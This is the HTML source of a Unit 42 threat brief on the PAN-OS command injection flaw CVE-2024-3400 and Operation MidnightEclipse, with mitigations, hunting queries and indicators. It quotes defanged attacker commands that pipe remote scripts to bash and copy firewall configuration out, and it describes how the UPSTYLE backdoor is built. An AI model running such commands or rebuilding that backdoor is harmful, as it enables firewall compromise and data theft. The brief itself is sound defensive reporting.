<!doctype html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="https://gmpg.org/xfn/11">
    <link rel="preconnect" href="https://www.paloaltonetworks.com">
    <link rel="preconnect" href="https://cdn.cookielaw.org">
    <link rel="preconnect" href="https://fonts.googleapis.com">
	    <!--  Start: Scripts Migrated From Unit42-v5 -->
<script type="text/javascript">
var main_site_url = 'https://www.paloaltonetworks.com';
var maindomain_lang = 'https://www.paloaltonetworks.com';
function getParameterByName(name, url) {
		if(url == null){
		  url = window.location.href;
		}
	    name = name.replace(/[\[\]]/g, '\\$&');
	    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
		results = regex.exec(url);
	    if (!results) return null;
	    if (!results[2]) return '';
	    return decodeURIComponent(results[2].replace(/\+/g, ' '));
	}
	var container_q = getParameterByName('container');
	var d_lang = 'en';	
</script>

<link rel="preload" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTop.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTop.min.css"></noscript>
<link rel="preload" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopProductNav.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopProductNav.min.css"></noscript>
<link rel="preload" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/deferedProductNav.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/deferedProductNav.min.css"></noscript>
  <meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/cve-2024-3400/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/cve-2024-3400/" />
<link rel="alternate" hreflang="x-default" href="https://unit42.paloaltonetworks.com/cve-2024-3400/" />

	<!-- This site is optimized with the Yoast SEO Premium plugin v23.7 (Yoast SEO v23.7) - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Threat Brief: Operation MidnightEclipse, Post-Exploitation Activity Related to CVE-2024-3400 (Updated May 20)</title>
	<meta name="description" content="We detail Operation MidnightEclipse, a campaign exploiting command injection vulnerability CVE-2024-3400, and include protections and mitigations." />
	<link rel="canonical" href="https://unit42.paloaltonetworks.com/cve-2024-3400/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Threat Brief: Operation MidnightEclipse, Post-Exploitation Activity Related to CVE-2024-3400 (Updated May 20)" />
	<meta property="og:description" content="We detail Operation MidnightEclipse, a campaign exploiting command injection vulnerability CVE-2024-3400, and include protections and mitigations." />
	<meta property="og:url" content="https://unit42.paloaltonetworks.com/cve-2024-3400/" />
	<meta property="og:site_name" content="Unit 42" />
	<meta property="article:published_time" content="2024-04-12T17:00:40+00:00" />
	<meta property="article:modified_time" content="2024-07-30T18:24:15+00:00" />
	<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/07_Nation-State-cyberattacks_1920x900.jpg" />
	<meta property="og:image:width" content="1920" />
	<meta property="og:image:height" content="900" />
	<meta property="og:image:type" content="image/jpeg" />
	<meta name="author" content="Unit 42" />
	<meta name="twitter:card" content="summary_large_image" />
	<!-- / Yoast SEO Premium plugin. -->


<link rel="alternate" type="application/rss+xml" title="Unit 42 &raquo; Feed" href="https://unit42.paloaltonetworks.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Unit 42 &raquo; Comments Feed" href="https://unit42.paloaltonetworks.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Unit 42 &raquo; Threat Brief: Operation MidnightEclipse, Post-Exploitation Activity Related to CVE-2024-3400 (Updated May 20) Comments Feed" href="https://unit42.paloaltonetworks.com/cve-2024-3400/feed/" />
<script type="text/javascript">
var globalConfig = {};
var webData = {};
webData.channel = "unit42";
webData.property = "unit42.paloaltonetworks.com";
webData.language = "en_us";
webData.pageType = "blogs";
webData.pageName = "unit42:cve-2024-3400";
webData.pageURL = "https://unit42.paloaltonetworks.com/cve-2024-3400";
webData.article_title = "Threat Brief: Operation MidnightEclipse, Post-Exploitation Activity Related to CVE-2024-3400 (Updated May 20)";
webData.author = "Unit 42";
webData.published_time = "2024-04-12T10:00:40-07:00";
webData.description = "We detail Operation MidnightEclipse, a campaign exploiting command injection vulnerability CVE-2024-3400, and include protections and mitigations.";
webData.keywords = "High Profile Threats,Malware,Vulnerabilities,backdoor,Command injection,CVE-2024-3400,MidnightEclipse,Python,Upstyle";
webData.resourceAssetID = "eb6ea16a236e32e9f03e3f2db10a6e93";
</script>
<script type="text/javascript">
var globalConfig = {};
globalConfig.buildName = "UniqueResourceAssetsID_DEC022022";
</script>
<meta property="og:likes" content="264"/>
<meta property="og:readtime" content="12"/>
<meta property="og:views" content="133,642"/>
<meta property="og:date_created" content="April 12, 2024 at 10:00 AM"/>
<meta property="og:post_length" content="3496"/>
<meta property="og:category" content="High Profile Threats"/>
<meta property="og:category" content="Malware"/>
<meta property="og:category" content="Vulnerabilities"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/top-cyberthreats/"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/malware/"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/vulnerabilities/"/>
<meta property="og:author" content="Unit 42"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/unit42/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta name="post_tags" content="backdoor,Command injection,CVE-2024-3400,MidnightEclipse,Python,Upstyle"/>
<meta property="og:post_image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/04/Threat-brief-r3d2.png"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Threat Brief: Operation MidnightEclipse, Post-Exploitation Activity Related to CVE-2024-3400 (Updated May 20)","name":"Threat Brief: Operation MidnightEclipse, Post-Exploitation Activity Related to CVE-2024-3400 (Updated May 20)","description":"We detail Operation MidnightEclipse, a campaign exploiting command injection vulnerability CVE-2024-3400, and include protections and mitigations.","url":"https:\/\/unit42.paloaltonetworks.com\/cve-2024-3400\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/cve-2024-3400\/","datePublished":"April 12, 2024","articleBody":"Executive Summary\r\nThis threat brief is monitored daily and updated as new intelligence is available for us to share. The full update log is at the end of this post and offers the fullest account of all changes made.\r\n\r\nPalo Alto Networks and Unit 42 are engaged in tracking activity related to CVE-2024-3400 and are working with external researchers, partners and customers to share information transparently and rapidly.\r\n\r\nA critical command injection vulnerability in Palo Alto Networks PAN-OS software enables an unauthenticated attacker to execute arbitrary code with root privileges on the firewall. The vulnerability, assigned CVE-2024-3400, has a CVSS score of 10.0.\r\n\r\nThis issue is applicable only to PAN-OS 10.2, PAN-OS 11.0, and PAN-OS 11.1 firewalls configured with GlobalProtect gateway or GlobalProtect portal (or both). This issue does not affect cloud firewalls (Cloud NGFW), Panorama appliances or Prisma Access.\r\n\r\nFor up-to-date information about affected products and versions, please refer to the Palo Alto Networks Security Advisory on this issue. Additionally, episode 21 of the Unit 42 podcast Threat Vector covers the discovery, technical details and exploitation of the vulnerability.\r\n\r\nPalo Alto Networks is aware of an increasing number of attacks that leverage the exploitation of this vulnerability. Third parties have disclosed proofs of concept for this vulnerability. We are also aware of a proof of concept including post-exploit persistence techniques that survive resets and upgrades. We are not aware of any malicious attempts to use these persistence techniques in active exploitation of the vulnerability at this time.\r\n\r\nWe are tracking the initial exploitation of this vulnerability under the name Operation MidnightEclipse.\r\n\r\nThe section Current Scope of the Attack includes information on the types of exploitation activity we have seen, as well as their relative prevalence. The vast majority of cases that Unit 42 has responded to have been unsuccessful attempts to exploit the vulnerability and some compromises of PAN-OS that are limited to confirming that the device is exploitable.\r\n\r\nOther cases have included the following activity:\r\n\r\n \tLimited attempts in which a file on the hard drive has been copied to a location accessible via a web request\r\n \tA very limited number of compromises that led to interactive command execution\r\n\r\nThis threat brief will cover information about the vulnerability and what we know about post-exploitation activity. We will share guidance to mitigate the vulnerability, though readers should also refer to the Security Advisory for specific product version information and remediation guidance. We will continue to update this threat brief as more information becomes available.\r\n\r\nIf you believe your firewall has been compromised, please reach out to Palo Alto Networks support.\r\n\r\nThis issue is fixed in hotfix releases of PAN-OS 10.2.9-h1, PAN-OS 11.0.4-h1, PAN-OS 11.1.2-h3 and all later PAN-OS versions. Hotfixes for other commonly deployed maintenance releases are also available. Additional guidance on mitigation for customers is available in the Security Advisory.\r\n\r\nA Knowledge Base article, How to Remedy CVE-2024-3400, is available in the Customer Support Portal.\r\n\r\nAs a matter of best practice, Palo Alto Networks recommends that you monitor your network for abnormal activity and investigate any unexpected network activity.\r\n\r\nWe would like to thank Volexity for finding this issue and their continuing coordination and partnership. Please reference Volexity\u2019s blog for their analysis.\r\n\r\nPalo Alto Networks customers receive protections from and mitigations for CVE-2024-3400 and malware used in post-exploitation activity in the following ways:\r\n\r\nCustomers with a Threat Prevention subscription can block attacks for this vulnerability using Threat ID 95187, 95189 and 95191 (available in Applications and Threats content version 8836-8695 and later). Our advisory has been updated with new Threat Prevention content updates for additional Threat Prevention IDs around CVE-2024-3400.\r\n\r\nTo apply the Threat IDs, customers must ensure that vulnerability protection has been applied to their GlobalProtect interface to prevent exploitation of this issue on their device. Please see the relevant LIVEcommunity article for more information.\r\n\r\nThe Managed Threat Hunting section below includes XQL queries that can be used to search for signs of exploitation of this CVE.\r\n\r\n\r\n\r\nVulnerabilities Discussed\r\nCVE-2024-3400\r\n\r\n\r\n\r\nDetails of the Vulnerability\r\nA command injection vulnerability in Palo Alto Networks PAN-OS software enables an unauthenticated attacker to execute arbitrary code with root privileges on the firewall. This issue is applicable only to PAN-OS 10.2, PAN-OS 11.0, and PAN-OS 11.1 firewalls configured with GlobalProtect gateway or GlobalProtect portal (or both).\u00a0\r\n\r\nPalo Alto Networks is aware of targeted attacks that leverage this vulnerability. The next section covers details of the post-exploitation activity we\u2019ve observed.\r\nCurrent Scope of the Attack\r\nPalo Alto Networks has classified observations of attempted exploitation into several levels, from Level 0 to Level 3. In all cases we recommend following the guidance in the Security Advisory.\r\n\r\nLevel 0: Probe \u2013 An unsuccessful exploitation attempt. Forensic artifacts indicate that the attempt was made to access the customer network, but the attacker did not actually succeed. Palo Alto Networks assesses there is likely little to no immediate impact of a Level 0 attempt.\r\n\r\nLevel 1: Test \u2013 The vulnerability was being tested on the device. A 0-byte file has been created and is resident on the firewall. However, there is no indication of any known unauthorized command execution.\r\n\r\nLevel 2: Potential Exfiltration \u2013 A file on the device has been copied to a location accessible via a web request, though the file may or may not have been subsequently downloaded. Typically, the file we have observed being copied is running_config.xml.\r\n\r\nLevel 3: Interactive Access \u2013 There are signs of interactive command execution. This may include shell-based backdoors, introduction of code, downloading files or running commands.\r\n\r\nIt is important to note that the vast majority of cases that Unit 42 has responded to have been unsuccessful attempts to exploit the vulnerability and some Level 1 compromises of PAN-OS. Other cases have included limited Level 2 and very limited Level 3 compromises of those targeted firewalls.\r\nUPSTYLE and Cron Job Backdoor Activity\r\nAs part of the activity observed in Operation MidnightEclipse, the threat actor exploited CVE-2024-3400 to run commands on the firewall. We have determined that the threat actor initially intended to install a Python-based backdoor, which our colleagues at Volexity referred to as UPSTYLE.\r\n\r\nWe believe the threat actors created UPSTYLE specifically for this campaign. However, the threat actors were unsuccessful at installing UPSTYLE after three different exploit attempts. After the third failed attempt, the threat actor decided to install a cron job backdoor to carry out their post-exploitation activities.\r\n\r\nAfter failing to install UPSTYLE, the threat actor was observed exploiting CVE-2024-3400 to run a handful of the commands on the firewall. The commands included copying configuration files to the web application folder and exfiltrating them via HTTP requests to those files.\r\n\r\nThe following IP address was seen attempting to access a specific configuration file copied to this folder, which we believe is a VPN used by the threat actor:\r\n\r\n \t66.235.168[.]222\r\n\r\nAfter gathering configuration files, the threat actor exploited the vulnerability to run the following command to receive additional commands from an external server in the form of a bash script:\r\n\r\n \twget -qO- hxxp:\/\/172.233.228[.]93\/patch|bash\r\n\r\nWe were unable to access the bash script hosted at this URL. However, shortly after we saw evidence of the creation of a cron job. This cron job would run every minute to access commands hosted on the same external server that would execute via bash, as seen in the following command:\r\n\r\n \twget -qO- hxxp:\/\/172.233.228[.]93\/policy | bash\r\n\r\nWe were unable to access the commands executed via this URL, but we believe this cron job-based backdoor was used to carry out the actor\u2019s post-exploitation activities.\r\n\r\nWhile the threat actors were unable to install the UPSTYLE backdoor, it appears that they created it specifically for this campaign and planned on using it as the initial backdoor. Also, the reason the actors failed to install UPSTYLE included mistakes in the exploit attempts themselves, as well as trivial mistakes in the executed commands. While we have not seen UPSTYLE used in any other exploit attempts, it is possible that UPSTYLE could have been successfully installed on other devices.\r\n\r\nAs previously mentioned, the threat actors attempted three unsuccessful exploit attempts to run commands to install UPSTYLE. For two of these attempts, UPSTYLE was hosted at hxxp:\/\/144.172.79[.]92\/update.py.\r\n\r\nIn the third exploit attempt, we saw the actor hosting the backdoor at nhdata.s3-us-west-2.amazonaws[.]com, which may suggest that the actors thought network-based protections caused the first two failed installation attempts. According to the following HTTP headers, it appears that the threat actor last modified UPSTYLE hosted at 144.172.79[.]92 on April 7, 2024:\r\nAccept-Ranges: bytes\r\nContent-Length: 5187\r\nContent-Type: application\/octet-stream\r\nDate: Thu, 11 Apr 2024 16:12:16 GMT\r\nEtag: \"6612443d-1443\"\r\nLast-Modified: Sun, 07 Apr 2024 06:59:09 GMT\r\nServer: nginx\/1.18.0 (Ubuntu)\r\nThe update.py file hosted at 144.172.79[.]92 has a SHA256 value of 3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac. This file is a backdoor that has multiple layers.\r\n\r\nFirst, update.py writes another Python script to the following location:\r\n\r\n \t[snip]\/site-packages\/system.pth\r\n\r\nThe Python script written to system.pth Base64-decodes an embedded Python script and executes it. This embedded Python script has two functions named protect and check, which are called in that order.\r\n\r\nThe protect function sends a SIGTERM signal and writes the contents of the system.pth file back to itself, likely as a persistence mechanism. The check function will read \/proc\/self\/cmdline to see if it is running as monitor mp before running another Base64 embedded Python script, which is the functional backdoor.\r\n\r\nThe Python script run by system.pth has a function named __main that will run in a thread. This function first reads the contents of the following file, along with its access and modified times:\r\n\r\n \t[snip]\/css\/bootstrap.min.css\r\n\r\nIt then enters an infinite loop that iterates once every two seconds, reading in the following file:\r\n\r\n \t[snip]\/sslvpn_ngx_error.log\r\n\r\nThe script will then iterate through each line of the file and search the line for the threat actor's command using the following regular expression:\r\n\r\n \timg\\[([a-zA-Z0-9+\/=]+)\\]\r\n\r\nIf the above regular expression matches, the script will Base64-encode the contents of the command and run it using the popen method within Python's OS module. The lines of the sslvpn_ngx_error.log file that do not match the regular expression are written back to the file, which essentially prunes the lines that contain commands from persisting in the sslvpn_ngx_error.log file for later analysis.\r\n\r\nAfter running the command, the script writes the output of the command to the following file:\r\n\r\n \t[snip]\/css\/bootstrap.min.css\r\n\r\nThe script will then create another thread that runs a function called restore. The restore function takes the original content of the bootstrap.min.css file, as well as the original access and modified times, sleeps for 15 seconds and writes the original contents back to the file. It then sets the access and modified times back to their original values.\r\n\r\nThe point of this function is to avoid leaving the output of the commands available for analysis. Also, this suggests that the threat actor has automation built into the client side of this backdoor, as they only have 15 seconds to grab the results before the backdoor overwrites the file.\r\n\r\nThe use of legitimate log files to receive commands and a legitimate CSS file to exfiltrate the command results suggests that the threat actors developed this backdoor specifically to run on a compromised firewall.\r\nGuidance\r\nWe strongly advise customers to immediately upgrade to a fixed version of PAN-OS to protect their devices even when workarounds and mitigations have been applied.\r\n\r\nThis issue is fixed in hotfix releases of PAN-OS 10.2.9-h1, PAN-OS 11.0.4-h1, PAN-OS 11.1.2-h3, and in all later PAN-OS versions.\u00a0\r\n\r\nPlease see the frequently updated Palo Alto Networks Security Advisory on CVE-2024-3400 for information on hotfixes and the most current guidance for mitigating this vulnerability. A Knowledge Base article, How to Remedy CVE-2024-3400, is available in the Customer Support Portal.\r\n\r\nIn earlier versions of this advisory, disabling device telemetry was listed as a secondary mitigation action. Disabling device telemetry is no longer an effective mitigation. Device telemetry does not need to be enabled for PAN-OS firewalls to be exposed to attacks related to this vulnerability.\r\nUnit 42 Managed Threat Hunting Queries\r\nThe Unit 42 Managed Threat Hunting team continues to track any attempts to exploit this CVE across our customers, using Cortex XDR and the XQL queries below. Cortex XDR customers can also use these XQL queries to search for signs of exploitation.\r\n\/\/ Description: Search for domain IOC in raw NGFW logs\r\ndataset = panw_ngfw_url_raw\r\n| filter url_domain ~= \".*nhdata.s3-us-west-2.amazonaws.com\"\r\n| fields _time, log_source_name, action, app, url_domain, uri, url_category, source_ip, source_port, dest_ip, dest_port, protocol, rule_matched, rule_matched_uuid\r\n\/\/ Description: Detect hits for the specific prevention signature for CVE-2024-3400\r\nconfig case_sensitive = false\r\n| dataset = panw_ngfw_threat_raw\r\n| filter threat_id in (95187,95189,95191)\r\n| fields _time, log_source_name, action, app_category, app_sub_category, threat_id, threat_name, source_ip, source_port, dest_ip, dest_port, *\r\n\r\n\/\/ Description: Hits for known IOCs in NGFW traffic\r\nconfig case_sensitive = false\r\n| dataset = panw_ngfw_traffic_raw\r\n| filter source_ip in (\"110.47.250.103\",\"126.227.76.24\",\"38.207.148.123\",\"147.45.70.100\",\"199.119.206.28\",\"38.181.70.3\",\"149.28.194.95\",\"78.141.232.174\",\"38.180.128.159\",\"64.176.226.203\",\"38.180.106.167\",\"173.255.223.159\",\"38.60.218.153\",\"185.108.105.110\",\"146.70.192.174\",\"149.88.27.212\",\"154.223.16.34\",\"38.180.41.251\",\"203.160.86.91\",\"45.121.51.2\",\"172.233.228.93\",\"66.235.168.222\",\"144.172.79.92\") or dest_ip in (\"110.47.250.103\",\"126.227.76.24\",\"38.207.148.123\",\"147.45.70.100\",\"199.119.206.28\",\"38.181.70.3\",\"149.28.194.95\",\"78.141.232.174\",\"38.180.128.159\",\"64.176.226.203\",\"38.180.106.167\",\"173.255.223.159\",\"38.60.218.153\",\"185.108.105.110\",\"146.70.192.174\",\"149.88.27.212\",\"154.223.16.34\",\"38.180.41.251\",\"203.160.86.91\",\"45.121.51.2\",\"172.233.228.93\",\"66.235.168.222\",\"144.172.79.92\")\u00a0\r\n| fields _time, log_source_name, action, action_source, app, bytes_sent, bytes_received, bytes_total, source_ip, source_port, dest_ip, dest_port, protocol, rule_matched, rule_matched_uuid, session_end_reason\r\n\r\n\/\/ Description: Hits for known IOCs in XDR telemetry and NGFW telemetry (assuming proper integration of NGFW)\r\nconfig case_sensitive = false\r\n| dataset = xdr_data\u00a0\r\n| filter event_type = ENUM.STORY\r\n| filter dst_action_external_hostname ~=\".*nhdata.s3-us-west-2.amazonaws.com\" OR\r\ndns_query_name ~=\".*nhdata.s3-us-west-2.amazonaws.com\" OR\r\naction_external_hostname ~=\".*nhdata.s3-us-west-2.amazonaws.com\" OR\r\naction_remote_ip in (\"110.47.250.103\",\"126.227.76.24\",\"38.207.148.123\",\"147.45.70.100\",\"199.119.206.28\",\"38.181.70.3\",\"149.28.194.95\",\"78.141.232.174\",\"38.180.128.159\",\"64.176.226.203\",\"38.180.106.167\",\"173.255.223.159\",\"38.60.218.153\",\"185.108.105.110\",\"146.70.192.174\",\"149.88.27.212\",\"154.223.16.34\",\"38.180.41.251\",\"203.160.86.91\",\"45.121.51.2\",\"172.233.228.93\",\"66.235.168.222\",\"144.172.79.92\")\u00a0\r\n| fields _time, agent_hostname, actor_process_image_name, action_local_ip, action_remote_ip, action_remote_port, dns_query_name, action_external_hostname\r\nAdditional Exploitation Observations\r\nWhile continuing to monitor efforts, we have observed additional IP addresses attempting to exploit CVE-2024-3400 based on our Threat Prevention signature with a Threat ID 95187. \r\n\r\nWe have not seen any relationships between these indicators and those associated with Operation MidnightEclipse. We have grouped the latter of these indicators exclusively to the activity involving exploitation of the zero-day vulnerability and the UPSTYLE backdoor.\r\n\r\nAs of writing this update, the following IP addresses have triggered the threat prevention signature:\r\n\r\n \t110.47.250[.]103\r\n \t126.227.76[.]24\r\n \t38.207.148[.]123\r\n \t147.45.70[.]100\r\n \t199.119.206[.]28\r\n \t38.181.70[.]3\r\n \t149.28.194[.]95\r\n \t78.141.232[.]174\r\n \t38.180.128[.]159\r\n \t64.176.226[.]203\r\n \t38.180.106[.]167\r\n \t173.255.223[.]159\r\n \t38.60.218[.]153\r\n \t185.108.105[.]110\r\n \t146.70.192[.]174\r\n \t149.88.27[.]212\r\n \t154.223.16[.]34\r\n \t38.180.41[.]251\u00a0\r\n \t203.160.86[.]91\r\n \t45.121.51[.]2\r\n\r\nFrom our analysis, we do not see any additional activity from these IP addresses outside probing the vulnerability to determine either if the firewall is vulnerable or compromised. We have seen the following commands within the exploit attempts that the threat prevention signature is blocking:\r\n\r\n \ttouch [snip]\/global-protect\/index.css\r\n \ttouch [snip]\/global-protect\/portal\/css\/test.min.css\r\n \tcp [snip]\/running-config.xml [snip]\/global-protect\/[16 random characters].css\r\n\r\nThe commands above show two examples of the use of the touch command to create an empty file in the web application folder. The client would then attempt to access this file via an HTTP request to determine if exploitation was successful. The third command shows a bit more malicious behavior, which involves copying the running configuration to the web application folder for access.\r\n\r\nWe have also seen probing attempts that use either wget or curl to access remote servers that an external party would use the outbound HTTP request to determine successful exploitation and command execution:\r\n\r\n \twget srgsd1f.842b727ba4.ipv6.1433.eu[.]org\r\n \twget edcjn.57fe6f5d9d.ipv6.1433.eu[.]org\r\n \tcurl srgsdf.842b727ba4.ipv6.1433.eu[.]org\r\n \twget --no-check-certificate https:\/\/45.121.51[.]2\/abc.txt\r\n\r\nConclusion\r\nThe Security Advisory will continue to provide up-to-date information on impacts to Palo Alto Networks products and recommended mitigations. We will continue to update this threat brief with information on exploitation.\r\n\r\nAgain, Palo Alto Networks would like to thank Volexity for finding this issue and their continuing coordination and partnership. Please reference Volexity's blog for their analysis.\r\n\r\nPalo Alto Networks has shared our findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the Cyber Threat Alliance.\r\n\r\nProtections and mitigations for the observed exploitation activity are below and will be updated as more become available.\r\nPalo Alto Networks Product Protections for CVE-2024-3400\r\nPalo Alto Networks customers can leverage a variety of product protections and updates to identify and defend against this threat.\r\n\r\nIf you think you may have been compromised or have an urgent matter, get in touch with Palo Alto Networks support.\r\nNext-Generation Firewalls and Prisma Access With Advanced Threat Prevention\r\nNext-Generation Firewall with the Advanced Threat Prevention security subscription can help block exploitation of CVE-2024-3400 via Threat Prevention signatures 95187, 95189 and 95191.\r\nCortex XDR, XSIAM and the Unified Cloud Agent\u00a0\r\nCortex XDR and XSIAM agents and analytics help protect and detect against post-exploitation activity if an attacker tries to enumerate or laterally move to other assets.\r\nCortex Xpanse and XSIAM ASM Module\r\nCortex Xpanse has the ability to identify exposed Palo Alto Networks GlobalProtect devices on the public internet and escalate these findings to defenders. Customers can enable alerting on this risk by ensuring that the Palo Alto Networks GlobalProtect Attack Surface Rule is enabled. Identified findings can either be viewed in the Threat Response Center or in the incident view of Expander. These findings are also available for Cortex XSIAM customers who have purchased the ASM module.\r\nIndicators of Compromise\r\nUPSTYLE Backdoor\r\n\r\n \t3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac\r\n \t5460b51da26c060727d128f3b3d6415d1a4c25af6a29fef4cc6b867ad3659078\r\n\r\nCommand and Control Infrastructure\r\n\r\n \t172.233.228[.]93\r\n \thxxp:\/\/172.233.228[.]93\/policy\r\n \thxxp:\/\/172.233.228[.]93\/patch\r\n \t66.235.168[.]222\r\n\r\nHosted Python Backdoor\r\n\r\n \t144.172.79[.]92\r\n \tnhdata.s3-us-west-2.amazonaws[.]com\r\n\r\nObserved Commands\r\n\r\n \twget -qO- hxxp:\/\/172.233.228[.]93\/patch|bash\r\n \twget -qO- hxxp:\/\/172.233.228[.]93\/policy | bash\r\n \t\"failed to unmarshal session(.\\+.\\\/\" mp-log gpsvc.log* (Please see our Security Advisory for further information on this command.)\r\n\r\nAdditional Resources\r\n\r\n \tUnderstanding the Midnight Eclipse Activity and CVE 2024-3400 \u2013 Unit 42 Threat Vector podcast, Episode 21, Palo Alto Networks\r\n \tHow to Remedy CVE-2024-3400 \u2013 Knowledge Base, Palo Alto Networks Customer Support Portal\r\n \tMore on the PAN-OS CVE-2024-3400 \u2013 Palo Alto Networks Blog\r\n \tCVE-2024-3400 PAN-OS: Arbitrary File Creation Leads to OS Command Injection Vulnerability in GlobalProtect\u00a0\u2013 Palo Alto Networks\r\n \tZero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400) \u2013 Volexity\r\n \tPalo Alto Networks Releases Guidance for Vulnerability in PAN-OS, CVE-2024-3400 \u2013 Cybersecurity and Infrastructure Security Agency (CISA)\r\n\r\nUpdate Log\r\n\r\n \tUpdated April 12, 2024, at 10:15 a.m. PT to add Cortex XDR and XSIAM product protections, as well as Additional Resources.\r\n \tUpdated April 12, 2024, at 12:45 a.m. PT to add Cortex Xpanse product protections.\r\n \tUpdated April 14, 2024, at 11:05 a.m. PT to clarify impact on GlobalProtect portal configurations.\r\n \tUpdated April 14, 2024, at 7:55 p.m. PT to reflect that hotfixes are in place and ETAs added in our Security Advisory for upcoming hotfixes.\r\n \tUpdated April 15, 2024, at 8:35 a.m. PT to update exploitation activity in Executive Summary.\r\n \tUpdated April 15, 2024, at 9:16 a.m. PT to update language on Threat ID 95187 in the Executive Summary, including information on firewalls managed by Panorama.\r\n \tUpdated April 16, 2024, at 7:45 a.m. PT to add Additional Exploitation Observations section with IoCs and commands.\r\n \tUpdated April 16, 2024, at 9:48 a.m. PT to remove update.py filename from list of indicators.\r\n \tUpdated April 16, 2024, at 2:00 p.m. PT to update the Executive Summary and Mitigations section to add new mitigation guidance, a new Threat Prevention signature and availability of PAN-OS fixes.\r\n \tUpdated April 16, 2024, at 2:40 p.m. PT to align the Executive Summary and Details of the Vulnerability sections more closely to the Security Advisory.\r\n \tUpdated April 17, 2024, at 6:15 a.m. PT to add Threat ID 95191.\r\n \tUpdated April 17, 2024, at 11:30 a.m. PT to add an additional bullet to the Observed Commands subsection.\r\n \tUpdated April 17, 2024, at 12:23 p.m. PT to clarify contact information.\r\n \tUpdated April 19, 2024, at 12:45 p.m. PT to heavily revise the Current Scope of Attack section as well the section on Operation MidnightEclipse activity (UPSTYLE and Cron Job Backdoor Activity).\r\n \tUpdated April 22, 2024, at 3:15 p.m. PT to more thoroughly define the levels of activity seen in the Current Scope of the Attack section.\r\n \tUpdated April 23, 2024, at 7:40 a.m. PT to add language to recommendations for Level 2 and Level 3 in Scope of Attack section. Clarified language in Guidance section. Added Update Log section.\r\n \tUpdated Apr 24, 2024, at 7:10 a.m. PT to include a link to a Customer Support Portal Knowledge Base article.\r\n \tUpdated April 24, 2024, at 6:15 p.m. PT to include updated XQL queries for hits for known IoCs in NGFW traffic and in XDR telemetry and NGFW telemetry.\r\n \tUpdated April 25, 2024, at 8:00 a.m. PT to add Knowledge Base article to Additional Resources.\r\n \tUpdated April 26, 2024, at 12:22 p.m. PT for clarity and consistency.\r\n \tUpdated April 29, 2024, at 6:52 a.m. to add Unit 42 Threat Vector podcast on the vulnerability to Additional Resources.\r\n \tUpdated April 29, 2024, at 11:55 a.m. PT to update exploitation status about proof of concept by third parties of post-exploit persistence techniques.\r\n \tUpdated May 1, 2024, at 8:05 a.m. PT for clarity and consistency.\r\n \tUpdated May 3, 2024, at 7:25 a.m. PT to note additional mitigation information for customers was added to the Security Advisory.\r\n \tUpdated May 20, 2024, at 8:10 a.m. PT to adjust second threat hunting query.\r\n","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2024\/06\/07_Nation-State-cyberattacks_1920x900-300x300.jpg","width":300,"height":300},"speakable":{"@type":"SpeakableSpecification","xPath":["\/html\/head\/title","\/html\/head\/meta[@name='description']\/@content"]},"author":[{"@type":"Person","name":"Unit 42"}]}</script><link rel='stylesheet' id='crayon-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' media='all' />
<style id='co-authors-plus-coauthors-style-inline-css'>
.wp-block-co-authors-plus-coauthors.is-layout-flow [class*=wp-block-co-authors-plus]{display:inline}

</style>
<style id='co-authors-plus-avatar-style-inline-css'>
